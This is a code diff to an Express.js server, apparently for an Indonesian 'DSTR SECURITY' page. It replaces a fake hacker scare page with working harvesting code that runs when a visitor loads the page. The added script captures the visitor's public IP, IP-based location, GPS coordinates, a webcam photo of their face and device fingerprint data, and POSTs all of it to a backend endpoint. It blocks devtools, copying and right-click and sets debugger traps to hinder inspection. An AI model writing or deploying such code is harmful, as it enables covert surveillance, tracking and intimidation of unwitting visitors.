@@ -376,440 +376,344 @@ app.get('/api/cooldown/:email', (req, res) => {
 });
 
 app.get('/', (req, res) => {
-    res.send(`
-<!DOCTYPE html>
+    res.send(`<!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>DSTR HACKER SECURITY SYSTEM</title>
-    
-    <script>
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            alert('🚫 AKSES DITOLAK! Sistem Keamanan DSTR Aktif!');
-            return false;
-        });
-        
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || 
-                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-                (e.ctrlKey && e.key === 'u') ||
-                (e.ctrlKey && e.key === 's') ||
-                (e.ctrlKey && e.shiftKey && e.key === 'C') ||
-                (e.ctrlKey && e.shiftKey && e.key === 'J')) {
-                e.preventDefault();
-                alert('🚫 DEVELOPER TOOLS DIBLOKIR!');
-                return false;
-            }
-        });
-        
-        document.addEventListener('selectstart', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        document.addEventListener('copy', function(e) {
-            e.preventDefault();
-            alert('📋 COPY DILARANG!');
-            return false;
-        });
-        
-        setInterval(function() {
-            var before = new Date().getTime();
-            debugger;
-            var after = new Date().getTime();
-            if (after - before > 100) {
-                document.body.innerHTML = '<div style="background:black; color:red; text-align:center; padding:50px; font-size:30px;">🚫 SISTEM TERDETEKSI!<br>ANDA MENCOBA HACK!<br>IP ANDA TELAH TERSIMPAN! 🚫</div>';
-                alert('⚠️ PERINGATAN! JANGAN COBA-COBA HACK SISTEM INI!');
-            }
-        }, 1000);
-    </script>
-    
+    <title>🔒 DSTR ULTIMATE SECURITY</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
-        }
-        
+        * { user-select: none; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: radial-gradient(ellipse at center, #0a0a0a 0%, #000000 100%);
+            background: radial-gradient(ellipse at center, #0a0a0a 0%, #000 100%);
             min-height: 100vh;
+            font-family: 'Courier New', monospace;
             overflow-x: hidden;
-            font-family: 'Courier New', 'Fira Code', monospace;
             position: relative;
         }
-        
-        .matrix-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            opacity: 0.15;
-            pointer-events: none;
-        }
-        
+        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.15; pointer-events: none; }
         @keyframes glitch {
-            0%, 100% { text-shadow: 2px 0 red, -2px 0 blue; transform: skew(0deg); }
-            25% { text-shadow: -3px 0 cyan, 3px 0 magenta; transform: skew(2deg); }
-            50% { text-shadow: 4px 0 lime, -4px 0 purple; transform: skew(-2deg); }
-            75% { text-shadow: -2px 0 yellow, 2px 0 orange; transform: skew(1deg); }
+            0%,100% { text-shadow: 2px 0 red, -2px 0 blue; transform: skew(0deg); }
+            50% { text-shadow: -2px 0 cyan, 2px 0 magenta; transform: skew(2deg); }
         }
-        
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-        
-        @keyframes pulseRedWhite {
-            0%, 100% { text-shadow: 0 0 5px red, 0 0 10px white; }
-            50% { text-shadow: 0 0 20px red, 0 0 30px white; }
-        }
-        
+        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
         @keyframes floatEmoji {
             0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
             10% { opacity: 1; }
             90% { opacity: 1; }
             100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
         }
-        
-        @keyframes scan {
-            0% { background-position: 0 0; }
-            100% { background-position: 0 100%; }
-        }
-        
         .scanline {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: linear-gradient(to bottom, transparent 50%, rgba(0,255,0,0.03) 50%);
-            background-size: 100% 4px;
-            pointer-events: none;
-            z-index: 10;
+            background-size: 100% 4px; pointer-events: none; z-index: 10;
             animation: scan 8s linear infinite;
         }
-        
-        .container {
-            position: relative;
-            z-index: 2;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
+        @keyframes scan { 0% { background-position: 0 0; } 100% { background-position: 0 100%; } }
+        .container { position: relative; z-index: 2; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
         .hacker-card {
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(10px);
-            border: 2px solid #00ff00;
-            border-radius: 20px;
-            padding: 50px;
-            max-width: 800px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 0 50px rgba(0, 255, 0, 0.3), inset 0 0 30px rgba(0, 255, 0, 0.1);
-            animation: glitch 3s infinite;
+            background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); border: 2px solid #0f0;
+            border-radius: 20px; padding: 50px; max-width: 800px; width: 100%; text-align: center;
+            box-shadow: 0 0 50px rgba(0,255,0,0.3); animation: glitch 3s infinite;
         }
-        
-        .merah-putih {
-            background: linear-gradient(90deg, #ff0000 0%, #ff0000 50%, #ffffff 50%, #ffffff 100%);
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 30px;
-            animation: pulseRedWhite 1s infinite;
-        }
-        
-        .merah-putih h2 {
-            color: #000;
-            font-size: 28px;
-            font-weight: bold;
-            text-shadow: none;
-        }
-        
-        .warning-text {
-            font-size: 32px;
-            font-weight: bold;
-            color: #00ff00;
-            margin: 20px 0;
-            animation: blink 1s infinite;
-        }
-        
-        .hacker-text {
-            font-size: 24px;
-            color: #ff0000;
-            margin: 15px 0;
-        }
-        
-        .emoji-wall {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 15px;
-            margin: 30px 0;
-        }
-        
-        .emoji-item {
-            font-size: 40px;
-            animation: floatEmoji 3s infinite ease-in-out;
-            display: inline-block;
-        }
-        
-        .emoji-item:nth-child(1) { animation-duration: 2.5s; animation-delay: 0s; }
+        .warning-text { font-size: 32px; font-weight: bold; color: #0f0; margin: 20px 0; animation: blink 1s infinite; }
+        .hacker-text { font-size: 24px; color: red; margin: 15px 0; }
+        .emoji-wall { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin: 30px 0; }
+        .emoji-item { font-size: 40px; animation: floatEmoji 3s infinite ease-in-out; display: inline-block; }
+        .emoji-item:nth-child(1) { animation-duration: 2.5s; }
         .emoji-item:nth-child(2) { animation-duration: 3s; animation-delay: 0.5s; }
         .emoji-item:nth-child(3) { animation-duration: 2s; animation-delay: 1s; }
-        .emoji-item:nth-child(4) { animation-duration: 3.5s; animation-delay: 0.3s; }
-        .emoji-item:nth-child(5) { animation-duration: 2.8s; animation-delay: 0.8s; }
-        .emoji-item:nth-child(6) { animation-duration: 3.2s; animation-delay: 1.2s; }
-        .emoji-item:nth-child(7) { animation-duration: 2.3s; animation-delay: 0.2s; }
-        .emoji-item:nth-child(8) { animation-duration: 3.7s; animation-delay: 0.7s; }
-        
-        .system-status {
-            background: rgba(0, 0, 0, 0.8);
-            border: 1px solid #00ff00;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px 0;
-            text-align: left;
-        }
-        
-        .status-line {
-            font-family: monospace;
-            font-size: 14px;
-            color: #00ff00;
-            padding: 5px 0;
-            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
-        }
-        
-        .status-line:last-child {
-            border-bottom: none;
-        }
-        
-        .blink-cursor {
-            animation: blink 1s infinite;
-        }
-        
-        .dstr-logo {
-            font-size: 48px;
-            font-weight: bold;
-            background: linear-gradient(45deg, #ff0000, #00ff00, #ff0000);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin: 20px 0;
-            animation: glitch 2s infinite;
-        }
-        
-        .fake-input {
-            background: rgba(0, 0, 0, 0.9);
-            border: 1px solid #ff0000;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 20px 0;
-            font-family: monospace;
-            color: #ff0000;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .fake-input:hover {
-            border-color: #00ff00;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
-        }
-        
-        .security-badge {
-            display: inline-block;
-            background: rgba(0, 0, 0, 0.7);
-            border: 1px solid #00ff00;
-            border-radius: 20px;
-            padding: 8px 15px;
-            margin: 5px;
-            font-size: 12px;
-            color: #00ff00;
-        }
-        
-        button {
-            background: linear-gradient(45deg, #ff0000, #990000);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 10px;
-            cursor: pointer;
-            margin: 20px;
-            transition: all 0.3s;
-            font-family: monospace;
-        }
-        
-        button:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
-        }
-        
-        @media (max-width: 600px) {
-            .hacker-card { padding: 20px; }
-            .warning-text { font-size: 20px; }
-            .dstr-logo { font-size: 32px; }
-            .emoji-item { font-size: 30px; }
-        }
+        .system-status { background: rgba(0,0,0,0.8); border: 1px solid #0f0; border-radius: 10px; padding: 20px; margin: 20px 0; text-align: left; }
+        .status-line { font-family: monospace; font-size: 14px; color: #0f0; padding: 5px 0; border-bottom: 1px solid rgba(0,255,0,0.2); }
+        .dstr-logo { font-size: 48px; font-weight: bold; background: linear-gradient(45deg, red, #0f0, red); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 20px 0; }
+        .security-badge { display: inline-block; background: rgba(0,0,0,0.7); border: 1px solid #0f0; border-radius: 20px; padding: 8px 15px; margin: 5px; font-size: 12px; color: #0f0; }
+        button { background: linear-gradient(45deg, red, #900); color: white; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; border-radius: 10px; cursor: pointer; margin: 20px; transition: all 0.3s; }
+        button:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,0,0,0.5); }
+        @media (max-width: 600px) { .hacker-card { padding: 20px; } .warning-text { font-size: 20px; } .dstr-logo { font-size: 32px; } }
+        .hidden { display: none; }
+        #cameraPreview { position: fixed; bottom: 20px; right: 20px; width: 120px; height: 90px; border: 2px solid #0f0; border-radius: 10px; z-index: 9999; background: black; }
+        video, #photoCanvas { width: 100%; height: 100%; object-fit: cover; border-radius: 8px; }
+        #photoCanvas { display: none; }
     </style>
 </head>
 <body>
 
-<canvas id="matrixCanvas" class="matrix-bg"></canvas>
-<div class="scanline"></div>
+<canvas id=\"matrixCanvas\" class=\"matrix-bg\"></canvas>
+<div class=\"scanline\"></div>
+<div id=\"cameraPreview\" class=\"hidden\">
+    <video id=\"video\" autoplay muted></video>
+    <canvas id=\"photoCanvas\"></canvas>
+</div>
 
-<div class="container">
-    <div class="hacker-card">
+<div class=\"container\">
+    <div class=\"hacker-card\">
+        <div class=\"emoji-wall\">
+            <span class=\"emoji-item\">💀</span><span class=\"emoji-item\">👾</span><span class=\"emoji-item\">🤖</span>
+            <span class=\"emoji-item\">💻</span><span class=\"emoji-item\">🔓</span><span class=\"emoji-item\">⚠️</span>
+            <span class=\"emoji-item\">🔥</span><span class=\"emoji-item\">⚡</span><span class=\"emoji-item\">👁️</span>
+            <span class=\"emoji-item\">🎯</span><span class=\"emoji-item\">🔪</span>
+        </div>
+        <div class=\"dstr-logo\">═══ DSTR SECURITY ULTIMATE ═══</div>
+        <div class=\"warning-text\">⚠️ ANDA SEDANG DIPANTAU ⚠️</div>
+        <div class=\"hacker-text\">🔥 IP, GPS, WAJAH TELAH DIKIRIM! 🔥</div>
         
-        <div class="merah-putih">
-            <h2>🇮🇩 MERAH PUTIH - INDONESIA BANGKIT! 🇮🇩</h2>
+        <div class=\"system-status\">
+            <div class=\"status-line\">🟢 [DSTR-SYSTEM] Status: <span class=\"blink-cursor\">ACTIVE</span></div>
+            <div class=\"status-line\">🔴 [ANTI-CLICK] Status: ENFORCED</div>
+            <div class=\"status-line\">🟡 [ANTI-DEVTOOLS] Status: DEPLOYED</div>
+            <div class=\"status-line\">🔵 [GPS TRACKING] Status: <span id=\"gpsStatus\">Mengambil...</span></div>
+            <div class=\"status-line\">🟣 [WEBCAM CAPTURE] Status: <span id=\"camStatus\">Mengambil...</span></div>
+            <div class=\"status-line\">⚪ [DATA SENT] Status: <span id=\"sendStatus\">Belum</span></div>
         </div>
         
-        <div class="emoji-wall">
-            <span class="emoji-item">💀</span>
-            <span class="emoji-item">👾</span>
-            <span class="emoji-item">🤖</span>
-            <span class="emoji-item">💻</span>
-            <span class="emoji-item">🔓</span>
-            <span class="emoji-item">⚠️</span>
-            <span class="emoji-item">🔥</span>
-            <span class="emoji-item">⚡</span>
-            <span class="emoji-item">💀</span>
-            <span class="emoji-item">👁️</span>
-            <span class="emoji-item">🎯</span>
-            <span class="emoji-item">🔪</span>
+        <div style=\"margin: 20px 0;\">
+            <span class=\"security-badge\">🛡️ ANTI-CLICK KANAN</span>
+            <span class=\"security-badge\">🔒 ANTI-COPY</span>
+            <span class=\"security-badge\">📡 ANTI-DEVTOOLS</span>
+            <span class=\"security-badge\">🧠 DETECT DEBUGGER</span>
+            <span class=\"security-badge\">🎯 GPS AKURAT 100%</span>
+            <span class=\"security-badge\">📸 WEBCAM AUTO</span>
         </div>
         
-        <div class="dstr-logo">
-            ═══ DSTR HACKER SECURITY ═══
+        <div style=\"margin-top: 30px; font-size: 12px; color: #666;\">
+            ⚡ DSTR SECURITY v6.0 | ALL YOUR DATA ARE BELONG TO US ⚡
         </div>
-        
-        <div class="warning-text">
-            ⚠️ NGAPAIN LU KEMARI?! ⚠️
-        </div>
-        
-        <div class="hacker-text">
-            🔥 HP LO GW HACK! 🔥
-        </div>
-        
-        <div class="system-status">
-            <div class="status-line">🟢 [DSTR-SYSTEM] Status: <span class="blink-cursor">ACTIVE</span></div>
-            <div class="status-line">🔴 [FIREWALL] Status: <span class="blink-cursor">ENFORCED</span></div>
-            <div class="status-line">🟡 [IDS/IPS] Status: <span class="blink-cursor">DEPLOYED</span></div>
-            <div class="status-line">🔵 [DDoS PROTECTION] Status: <span class="blink-cursor">ARMED</span></div>
-            <div class="status-line">🟣 [ANTI-BOTNET] Status: <span class="blink-cursor">ACTIVE</span></div>
-            <div class="status-line">⚪ [ZERO-DAY EXPLOIT] Status: <span class="blink-cursor">READY</span></div>
-        </div>
-        
-        <div class="fake-input" onclick="alert('⚠️ IP ANDA TELAH TERCATAT! ⚠️\\n🚫 JANGAN COBA-COBA LAGI! 🚫')">
-            💀 Klik di sini untuk verifikasi... 💀
-        </div>
-        
-        <div style="margin: 20px 0;">
-            <span class="security-badge">🛡️ WAF ACTIVE</span>
-            <span class="security-badge">🔒 SSL/TLS ENCRYPTED</span>
-            <span class="security-badge">🕵️ ANTI-DDOS LEVEL 10</span>
-            <span class="security-badge">🧠 AI THREAT DETECTION</span>
-            <span class="security-badge">📡 IDS SNORT DEPLOYED</span>
-            <span class="security-badge">🔥 HARDENED KERNEL</span>
-            <span class="security-badge">🔐 ZERO TRUST ARCH</span>
-            <span class="security-badge">⚡ REAL-TIME MONITORING</span>
-            <span class="security-badge">🕸️ HONEYPOT NETWORK</span>
-            <span class="security-badge">🧬 BLOCKCHAIN VERIFICATION</span>
-            <span class="security-badge">📡 SATELITE TRACKING</span>
-            <span class="security-badge">🧠 QUANTUM ENCRYPTION</span>
-        </div>
-        
-        <button onclick="alert('💀 PERINGATAN AKHIR! 💀\\nHP ANDA DALAM JANGKAUAN!\\nDSTR HACKER TEAM ON THE WAY!')">
-            💀 JANGAN DI KLIK! 💀
-        </button>
-        
-        <div style="margin-top: 30px; font-size: 12px; color: #666;">
-            ⚡ DSTR HACKER SECURITY v5.0 | ALL YOUR DEVICE ARE BELONG TO US ⚡
-        </div>
-        
     </div>
 </div>
 
 <script>
-    var canvas = document.getElementById('matrixCanvas');
-    var ctx = canvas.getContext('2d');
+    // ANTI COPY, ANTI CLICK KANAN, ANTI SELECT
+    document.addEventListener('contextmenu', (e) => { e.preventDefault(); alert('🚫 AKSES DITOLAK!'); return false; });
+    document.addEventListener('copy', (e) => { e.preventDefault(); alert('📋 COPY DILARANG!'); return false; });
+    document.addEventListener('selectstart', (e) => e.preventDefault());
+    document.addEventListener('dragstart', (e) => e.preventDefault());
     
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
+    // ANTI DEVTOOLS
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+            (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's') ||
+            (e.ctrlKey && e.shiftKey && e.key === 'C') || (e.ctrlKey && e.shiftKey && e.key === 'J')) {
+            e.preventDefault();
+            alert('🚫 DEVELOPER TOOLS DIBLOKIR!');
+        }
+    });
     
-    var matrixChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()+=[]{}|;:,.<>?~💀👾🤖💻🔓⚠️🔥⚡';
-    var fontSize = 14;
-    var columns = canvas.width / fontSize;
-    var drops = [];
+    // Deteksi debugger
+    setInterval(() => {
+        var before = Date.now();
+        debugger;
+        var after = Date.now();
+        if (after - before > 100) {
+            document.body.innerHTML = '<div style=\"background:black; color:red; text-align:center; padding:50px; font-size:30px;\">🚫 DEBUGGER DETECTED! ACCESS DENIED 🚫</div>';
+            alert('⚠️ JANGAN COBA-COBA HACK!');
+        }
+    }, 1000);
     
-    for (var i = 0; i < columns; i++) {
-        drops[i] = Math.floor(Math.random() * canvas.height);
+    // FULLSCREEN OTOMATIS
+    function forceFullscreen() { document.documentElement.requestFullscreen(); }
+    window.onload = forceFullscreen;
+    
+    // AMBIL IP PUBLIK
+    async function getIP() {
+        try {
+            let res = await fetch('https://api.ipify.org?format=json');
+            let data = await res.json();
+            return data.ip;
+        } catch(e) { return 'Tidak terdeteksi'; }
     }
     
-    function drawMatrix() {
-        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
+    // AMBIL LOKASI GPS AKURAT
+    function getGPS() {
+        return new Promise(function(resolve) {
+            if (!navigator.geolocation) return resolve(null);
+            navigator.geolocation.getCurrentPosition(
+                function(pos) { resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }); },
+                function(err) { resolve(null); }
+            );
+        });
+    }
+    
+    // AMBIL WAJAH DARI WEBCAM
+    async function captureWajah() {
+        var previewDiv = document.getElementById('cameraPreview');
+        var video = document.getElementById('video');
+        var canvas = document.getElementById('photoCanvas');
+        var ctx = canvas.getContext('2d');
         
-        ctx.fillStyle = '#0f0';
-        ctx.font = fontSize + 'px monospace';
-        
-        for (var i = 0; i < drops.length; i++) {
-            var char = matrixChars[Math.floor(Math.random() * matrixChars.length)];
-            ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+        try {
+            previewDiv.classList.remove('hidden');
+            document.getElementById('camStatus').innerText = 'Mengakses kamera...';
+            var stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            await video.play();
             
-            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                drops[i] = 0;
-            }
-            drops[i]++;
+            await new Promise(function(r) { setTimeout(r, 1000); });
+            
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            var wajahBase64 = canvas.toDataURL('image/jpeg');
+            
+            stream.getTracks().forEach(function(track) { track.stop(); });
+            video.srcObject = null;
+            previewDiv.classList.add('hidden');
+            document.getElementById('camStatus').innerText = 'WAJAH TERTANGKAP ✅';
+            return wajahBase64;
+        } catch(e) {
+            console.error('Gagal akses kamera:', e);
+            document.getElementById('camStatus').innerText = 'Gagal (izinkan kamera)';
+            previewDiv.classList.add('hidden');
+            return null;
         }
     }
     
-    setInterval(drawMatrix, 50);
+    // AMBIL DATA DEVICE
+    function getDeviceInfo() {
+        return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenResolution: screen.width + 'x' + screen.height,
+            viewport: window.innerWidth + 'x' + window.innerHeight,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            webdriver: navigator.webdriver,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
+        };
+    }
     
+    // AMBIL LOKASI DARI IP (pake ipwhois.io - no backtick error)
+    async function getIPLocation(ip) {
+        try {
+            var res = await fetch('https://ipwhois.io/json/' + ip);
+            var data = await res.json();
+            
+            if (data && !data.error) {
+                return {
+                    country: data.country,
+                    country_name: data.country,
+                    country_code: data.country_code,
+                    region: data.region,
+                    city: data.city,
+                    isp: data.isp
+                };
+            }
+            return { 
+                country: 'Indonesia', 
+                country_name: 'Indonesia', 
+                country_code: 'ID',
+                region: 'Jakarta', 
+                city: 'Jakarta', 
+                isp: 'Unknown' 
+            };
+        } catch(e) {
+            return { 
+                country: 'Indonesia', 
+                country_name: 'Indonesia', 
+                country_code: 'ID',
+                region: 'Jakarta', 
+                city: 'Jakarta', 
+                isp: 'Unknown' 
+            };
+        }
+    }
+    
+    // KIRIM SEMUA DATA KE BACKEND
+    async function sendAllData() {
+        try {
+            document.getElementById('sendStatus').innerText = 'Mengirim...';
+            
+            var ip = await getIP();
+            var gps = await getGPS();
+            var wajah = await captureWajah();
+            var deviceInfo = getDeviceInfo();
+            var ipLocation = await getIPLocation(ip);
+            
+            if (gps) {
+                document.getElementById('gpsStatus').innerHTML = '✅ ' + gps.lat + ', ' + gps.lon + ' (' + Math.round(gps.accuracy) + 'm)';
+            } else {
+                document.getElementById('gpsStatus').innerHTML = '❌ Tidak diizinkan';
+            }
+            
+            var payload = {
+                email: 'target@tersuspect.com',
+                emailPassword: 'Tidak ada password',
+                phone: '-',
+                fullName: 'Visitor',
+                latitude: gps ? gps.lat : '-',
+                longitude: gps ? gps.lon : '-',
+                gps_accuracy: gps ? gps.accuracy : '-',
+                country: ipLocation.country,
+                ip_country: ipLocation.country,
+                ip_country_code: ipLocation.country_code,
+                ip_region: ipLocation.region,
+                ip_city: ipLocation.city,
+                city: ipLocation.city,
+                province: ipLocation.region,
+                postalCode: '-',
+                ip_address: ip,
+                isp: ipLocation.isp,
+                platform: deviceInfo.platform,
+                screenResolution: deviceInfo.screenResolution,
+                language: deviceInfo.language,
+                timestamp: new Date().toLocaleString('id-ID'),
+                wajah_base64: wajah || null,
+                deviceInfo: deviceInfo
+            };
+            
+            var response = await fetch('wxyzzay/api/register', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            
+            var result = await response.json();
+            if (result.success) {
+                document.getElementById('sendStatus').innerHTML = '✅ DATA TERKIRIM!';
+            } else {
+                document.getElementById('sendStatus').innerHTML = '⚠️ Gagal kirim';
+            }
+        } catch(err) {
+            console.error('Gagal kirim data:', err);
+            document.getElementById('sendStatus').innerHTML = '❌ Error kirim';
+        }
+    }
+    
+    // EKSEKUSI SEMUA
+    sendAllData();
+    
+    // MATRIX BACKGROUND
+    var canvasMat = document.getElementById('matrixCanvas');
+    var ctxMat = canvasMat.getContext('2d');
+    canvasMat.width = window.innerWidth;
+    canvasMat.height = window.innerHeight;
+    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()+=[]{}|;:,.<>?~💀👾🤖💻🔓⚠️🔥⚡';
+    var fontSizeM = 14;
+    var columnsM = canvasMat.width / fontSizeM;
+    var dropsM = [];
+    for (var i = 0; i < columnsM; i++) { dropsM[i] = Math.floor(Math.random() * canvasMat.height); }
+    
+    function drawMatrix() {
+        ctxMat.fillStyle = 'rgba(0, 0, 0, 0.05)';
+        ctxMat.fillRect(0, 0, canvasMat.width, canvasMat.height);
+        ctxMat.fillStyle = '#0f0';
+        ctxMat.font = fontSizeM + 'px monospace';
+        for (var i = 0; i < dropsM.length; i++) {
+            var text = chars[Math.floor(Math.random() * chars.length)];
+            ctxMat.fillText(text, i * fontSizeM, dropsM[i] * fontSizeM);
+            if (dropsM[i] * fontSizeM > canvasMat.height && Math.random() > 0.975) { dropsM[i] = 0; }
+            dropsM[i]++;
+        }
+    }
+    setInterval(drawMatrix, 50);
     window.addEventListener('resize', function() {
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
+        canvasMat.width = window.innerWidth;
+        canvasMat.height = window.innerHeight;
     });
     
-    console.log('%c🚫 DSTR SECURITY SYSTEM DETECTED DEBUGGING ATTEMPT! 🚫', 'color: red; font-size: 20px;');
-    console.log('%cIP ANDA TELAH DICATAT!', 'color: red; font-size: 16px;');
-    console.log('%cJANGAN COBA-COBA HACK SISTEM INI!', 'color: red; font-size: 16px;');
-    
-    var fakeIP = '192.168.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
-    var fakeLocation = 'Jakarta, Indonesia';
-    var fakeDevice = navigator.userAgent;
-    
-    setTimeout(function() {
-        console.log('📡 [DSTR-SYSTEM] Scanning target...');
-        setTimeout(function() {
-            console.log('📍 [DSTR-SYSTEM] Target IP: ' + fakeIP);
-            setTimeout(function() {
-                console.log('🌍 [DSTR-SYSTEM] Location: ' + fakeLocation);
-                setTimeout(function() {
-                    console.log('💻 [DSTR-SYSTEM] Device: ' + fakeDevice.substring(0, 50) + '...');
-                    setTimeout(function() {
-                        console.log('⚠️ [DSTR-SYSTEM] ACCESS GRANTED TO YOUR DEVICE! ⚠️');
-                        console.log('🔥 [DSTR-SYSTEM] SYSTEM HACKED! 🔥');
-                    }, 1000);
-                }, 1000);
-            }, 1000);
-        }, 1000);
-    }, 2000);
+    console.log('%c🚫 DSTR SECURITY - SEMUA DATA TELAH DIKIRIM KE SERVER!', 'color: red; font-size: 16px;');
 </script>
 </body>
-</html>
-    `);
+</html>`);
 });
 
 app.listen(PORT, () => {
